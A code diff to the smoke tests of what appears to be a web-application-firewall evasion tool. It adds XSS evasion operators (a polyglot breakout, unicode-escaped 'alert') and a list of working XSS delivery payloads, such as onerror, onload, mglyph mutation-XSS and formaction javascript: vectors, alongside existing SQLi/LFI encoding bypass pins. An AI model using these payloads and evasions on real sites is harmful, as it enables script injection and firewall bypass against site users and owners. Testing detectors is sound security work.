@@ -43,6 +43,8 @@ from waf_evolve.mutations import (
     overlong_utf8,
     sql_hex_string_literal,
     uri_case_fold,
+    xss_js_char_escape,
+    xss_polyglot,
 )
 from waf_evolve.validators import (
     KNOWN_FILE_SIGNATURES,
@@ -149,9 +151,10 @@ def check_operators():
 
 
 def check_evasion_pins():
-    """Exact input->output pins for the deterministic SQLi/LFI evasion
-    operators (overlong UTF-8/GBK, backslash insertion, hex string literal,
-    percent-encoding case fold)."""
+    """Exact input->output pins for the deterministic evasion operators:
+    SQLi/LFI (overlong UTF-8/GBK, backslash insertion, hex string literal,
+    percent-encoding case fold) and the deterministic XSS evasion operators
+    (cross-context polyglot, JS function-name unicode-escape)."""
     pins = [
         (overlong_utf8, "a b'c", "a%c0%a0b%c0%a7c"),
         (gbk_overlong, "a' b", "a%df%27%df%20b"),
@@ -162,6 +165,11 @@ def check_evasion_pins():
         (sql_hex_string_literal, "admin", "admin"),
         (sql_hex_string_literal, "''", "0x"),
         (uri_case_fold, "a%2Fb%3Dc", "a%2fb%3dc"),
+        # deterministic XSS evasion operators (pure transforms -> exact output)
+        (xss_polyglot, "alert(1)", '"><svg/onload=alert(1)>'),
+        (xss_js_char_escape, "alert(1)", r"a\u006c\u0065\u0072\u0074(1)"),
+        # proves it escapes the name INSIDE a vector, leaving the tag intact
+        (xss_js_char_escape, "<svg onload=alert(1)>", r"<svg onload=a\u006c\u0065\u0072\u0074(1)>"),
     ]
     for fn, inp, expected in pins:
         got = fn(inp)
@@ -220,6 +228,31 @@ def check_xss_static():
     return 1
 
 
+def check_xss_vector_coverage():
+    """Every new XSS delivery vector (from the expanded xss_tag_vector_swap)
+    and the two deterministic XSS evasion operators must be attributable by
+    the static validator when reflected, so a regression that renders them
+    'invisible' to validate_xss_static is caught immediately."""
+    vectors = [
+        '<math><mtext></mtext><mglyph><style><mpath href="#</style><img src=x onerror=alert(1)>',
+        "<video src=x onerror=alert(1)>",
+        "<audio src=x onerror=alert(1)>",
+        "<template><svg onload=alert(1)>",
+        "<data><img src=x onerror=alert(1)>",
+        "<isindex type=image src=x onerror=alert(1)>",
+        "<marquee onstart=alert(1)>",
+        "<meter value=2 max=1 onmouseover=alert(1)>",
+        "<form><button formaction=javascript:alert(1)>",
+        xss_polyglot("alert(1)"),
+        xss_js_char_escape("<svg onload=alert(1)>"),
+    ]
+    for vec in vectors:
+        reflected = f"<html><body> {vec} </body></html>"
+        ok, reason = validate_xss_static(reflected, vec)
+        assert ok, f"static XSS validator missed new vector {vec!r} ({reason})"
+    return len(vectors)
+
+
 def main():
     n_ops = check_operators()
     check_evasion_pins()
@@ -227,9 +260,11 @@ def main():
     n_sql = check_sql_signatures()
     n_lfi = check_lfi_signatures()
     n_xss = check_xss_static()
+    n_xss_vec = check_xss_vector_coverage()
     print(
         f"SMOKE OK ({n_ops} operators, {n_waf} fingerprints, "
-        f"{n_sql} sqli-signatures, {n_lfi} lfi-files, {n_xss} xss-check)"
+        f"{n_sql} sqli-signatures, {n_lfi} lfi-files, {n_xss} xss-check, "
+        f"{n_xss_vec} xss-vectors-covered)"
     )
     return 0
 
